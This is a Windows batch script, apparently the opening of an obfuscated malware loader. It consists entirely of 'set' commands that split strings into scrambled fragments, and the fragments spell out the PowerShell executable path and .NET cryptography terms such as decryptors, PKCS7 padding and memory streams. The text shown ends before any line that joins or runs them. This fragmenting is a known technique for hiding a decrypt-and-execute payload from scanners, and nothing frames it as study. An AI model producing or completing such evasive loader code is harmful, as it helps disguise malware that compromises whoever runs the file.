@echo off
set "HKjapYcheu= /"
set "ooJFTFMhnL=py"
set "wWSxpYFmJW=s\"
set "PMFosPTymF=1."
set "IOBSQnsmco=.e"
set "MJnnCfhKNI=ll"
set "PHltHGiZhw=do"
set "YcLRebOtcJ=\v"
set "ZiChstYrTm=nd"
set "LfzkNmmLge= C"
set "ogGAIkXXjB=xe"
set "FwRikbDTxb=in"
set "osOZMZrtPT=he"
set "TrtlWFOxOE=we"
set "nplfOqiPoP=:\"
set "waJhieBhUx=rS"
set "cyBlNqUzMT=Po"
set "vNznAQUNkD=Wi"
set "yyBGzjxBve=co"
set "WMurRZdDRD=ow"
set "AORySNNwFc=0\"
set "rzADefMdNv=Sy"
set "mZQwlFaQEG=\W"
set "tpohIzQWiy=y "
set "MqWHgdpfSt=em"
set "xnGqcOQVYS=ll"
set "BdxVYrfaFq=he"
set "mJxhikkmZr=rs"
set "sQWbTJsivB=st"
set "NLIWUxlRmM=32"
set "WQulyysGRW=po"
set "xBVJoMzzwB=ws"
set "CLXWAZeYUM=we"
set "LVdtvbChne= %~dp0"
set "eaCHEWfEzo=cd"
set "iYouHiufhA=ment"
set "NUSOJtdxhr=stem"
set "zPQEScCisV=raph"
set "KalcemReXg=Etk/"
set "rmgPtKXvYg=form"
set "GHIWUuoUho=  $O"
set "EfOsvhrjEP=P4Ia"
set "MoMAdatYIU=sion"
set "qzmYxTilxN=m.Re"
set "idSewCxsoe=mory"
set "oIwPCIfRDV=$piV"
set "IOoGrntYQS=ddin"
set "MtXbSZwQkF=OoQ "
set "pZbYoHyCkz=rt]:"
set "dnJGZujUVE=pose"
set "AgLDKsiWsj=SRH."
set "hxyuXkKyfe=Bmor"
set "xiAPzZLgQB=::De"
set "UzbSlalecU= [Sy"
set "tfNyNAaVpM=tion"
set "KQnECYfFGk=Conv"
set "hfTnPliWKt=oryS"
set "NsbJqEOTOC=ew-O"
set "qvUjFDfMby=SRH "
set "rKOjPVDbtT=1..-"
set "pBELFbDQJC=null"
set "DwVlGghDWm='gni"
set "HIflOMOgmK=)($O"
set "lDgOyqcxYZ=znSk"
set "MpzLhffuXL=);$O"
set "EjdYzksJux=.Cre"
set "vjRXxwTEKS=New-"
set "gxoQewazim=H.Su"
set "gxfEIodRni=PKCS"
set "EsuTymZMUD=aRYR"
set "GIXDyjhczG=ct S"
set "KlpQjVatpZ=[]] "
set "toLUoWAlCX=pStr"
